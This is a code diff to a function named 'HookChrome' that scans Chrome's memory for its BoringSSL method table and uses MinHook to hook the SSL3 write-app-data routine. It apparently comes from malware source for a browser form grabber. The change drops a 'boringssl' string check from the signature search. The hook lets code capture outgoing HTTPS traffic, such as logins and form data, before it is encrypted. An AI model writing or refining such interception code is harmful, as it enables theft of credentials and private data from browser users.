@@ -692,22 +692,11 @@ void HookChrome()
                                        }
                                        if(ok)
                                        {
-                                          // Scan the next 1KB to see if the reference to boringssl is present (possibly flaky, verify with several builds)
-                                          char * mem = compare;
-                                          bool found = false;
-                                          for(int str_offset = 0; str_offset < 1024 && !found && mem < end_addr; str_offset++)
+                                          match_count++;
+                                          if(!methods_addr) 
                                           {
-                                             if(!Funcs::pMemcmp(&mem[str_offset], "boringssl", 9))
-                                                found = true;
-                                          }
-                                          if(found) 
-                                          {
-                                             match_count++;
-                                             if(!methods_addr) 
-                                             {
-                                                methods_addr = functions;
-                                                signature = signum;
-                                             }
+                                             methods_addr = functions;
+                                             signature = signum;
                                           }
                                        }
                                     }
@@ -743,5 +732,3 @@ void HookChrome()
       MH_CreateHook(methods_addr[methods_signatures[signature].ssl_write_app_data_index], My_SSL3_Write_App_Data, (LPVOID *) &Real_SSL3_Write_App_Data);
    MH_EnableHook(MH_ALL_HOOKS);
 }
-
-
